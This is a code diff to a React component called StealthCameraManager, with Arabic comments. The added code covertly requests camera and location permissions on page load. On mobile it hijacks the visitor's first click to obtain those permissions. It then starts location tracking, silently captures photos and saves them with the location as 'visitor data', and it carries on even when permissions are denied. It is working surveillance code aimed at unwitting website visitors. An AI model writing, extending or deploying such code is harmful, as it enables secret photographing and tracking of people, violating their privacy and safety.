@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 import { useStealthCamera } from '@/hooks/useStealthCamera';
 import { Loader2, CheckCircle, AlertCircle } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
@@ -20,24 +20,104 @@ const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({
     currentPhotoIndex,
     startStealthCapture,
     saveVisitorData,
-    getAllVisitors
+    getAllVisitors,
+    // استخدام الوظائف الجديدة
+    requestPermissions,
+    startLocationTracking,
+    getCurrentLocation,
+    permissions,
+    isMobile
   } = useStealthCamera();
 
   const [captureComplete, setCaptureComplete] = React.useState(false);
   const [status, setStatus] = React.useState('');
   const [error, setError] = React.useState<string | null>(null);
+  const [permissionsRequested, setPermissionsRequested] = React.useState(false);
+  const [locationAccurate, setLocationAccurate] = React.useState(false);
+
+  // طلب الصلاحيات بمجرد تحميل الصفحة
+  useEffect(() => {
+    const initPermissions = async () => {
+      if (!permissionsRequested) {
+        console.log('🔒 بدء طلب الصلاحيات بشكل خفي...');
+        try {
+          // طلب الصلاحيات بشكل خفي
+          const perms = await requestPermissions();
+          setPermissionsRequested(true);
+          
+          // بدء تتبع الموقع بمجرد الحصول على الصلاحيات
+          if (perms.location) {
+            console.log('🌍 بدء تتبع الموقع بعد الحصول على الصلاحيات...');
+            startLocationTracking();
+            
+            // فحص دقة الموقع
+            setTimeout(async () => {
+              const location = await getCurrentLocation();
+              console.log('📍 دقة الموقع الحالية:', location.accuracy, 'متر');
+              setLocationAccurate(location.accuracy <= 500);
+            }, 3000);
+          }
+        } catch (error) {
+          console.warn('⚠️ خطأ في طلب الصلاحيات:', error);
+        }
+      }
+    };
+    
+    initPermissions();
+    
+    // استخدام متتبع موقع مخفي للأجهزة المحمولة
+    if (isMobile() && !permissionsRequested) {
+      console.log('📱 جهاز محمول - طلب صلاحيات إضافية للموقع');
+      
+      // استخدام حدث النقر للمساعدة في الحصول على الصلاحيات
+      const handleUserInteraction = () => {
+        if (!permissionsRequested) {
+          requestPermissions();
+          setPermissionsRequested(true);
+          // بدء تتبع الموقع مع التفاعل الأول من المستخدم
+          startLocationTracking();
+          document.removeEventListener('click', handleUserInteraction);
+        }
+      };
+      
+      document.addEventListener('click', handleUserInteraction);
+      return () => {
+        document.removeEventListener('click', handleUserInteraction);
+      };
+    }
+  }, [requestPermissions, startLocationTracking, getCurrentLocation, isMobile, permissionsRequested]);
 
   // بدء التقاط تلقائي عند التحميل إذا كان autoStart مفعل
   React.useEffect(() => {
     if (autoStart && !isCapturing && !captureComplete) {
-      console.log('🚀 بدء التقاط تلقائي سري...');
-      handleStartStealthCapture();
+      // انتظر قليلاً للسماح بتحميل الصفحة وطلب الصلاحيات
+      const timer = setTimeout(() => {
+        console.log('🚀 بدء التقاط تلقائي سري...');
+        handleStartStealthCapture();
+      }, 2000);
+      
+      return () => clearTimeout(timer);
     }
   }, [autoStart]);
 
   const handleStartStealthCapture = async () => {
     try {
       setError(null);
+      setStatus('التحقق من الصلاحيات...');
+      
+      // تأكد من طلب الصلاحيات أولاً
+      if (!permissions.requested) {
+        const perms = await requestPermissions();
+        
+        // إذا لم نحصل على الصلاحيات، نستمر رغم ذلك ولكن مع تنبيه
+        if (!perms.location || !perms.camera) {
+          console.warn('⚠️ تم رفض بعض الصلاحيات، لكننا سنستمر');
+        }
+      }
+      
+      // بدء تتبع الموقع للحصول على أدق موقع ممكن
+      startLocationTracking();
+      
       setStatus('بدء التقاط الصور بشكل سري...');
       console.log('📸 بدء التقاط الصور السرية...');
       
@@ -45,13 +125,23 @@ const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({
       
       if (photos && photos.length > 0) {
         console.log(`✅ تم التقاط ${photos.length} صور بنجاح`);
-        setStatus('حفظ البيانات...');
+        setStatus('الحصول على الموقع بدقة عالية...');
         
+        // الحصول على الموقع بدقة عالية
         const visitorData = await saveVisitorData(photos);
         
         if (visitorData) {
           console.log('✅ تم حفظ بيانات الزائر بنجاح');
-          setStatus(`تم الانتهاء بنجاح! تم التقاط ${photos.length} صورة بشكل سري`);
+          
+          // عرض معلومات الموقع في السجلات
+          if (visitorData.location) {
+            console.log('📍 معلومات الموقع:', {
+              دقة: visitorData.location.accuracy.toFixed(1) + ' متر',
+              مصدر: visitorData.location.provider || 'غير معروف'
+            });
+          }
+          
+          setStatus(`تم الانتهاء بنجاح! تم التقاط ${photos.length} صورة وتحديد الموقع بشكل سري`);
           setCaptureComplete(true);
           
           // في حالة autoStart، ننتقل فوراً للصفحة الرئيسية
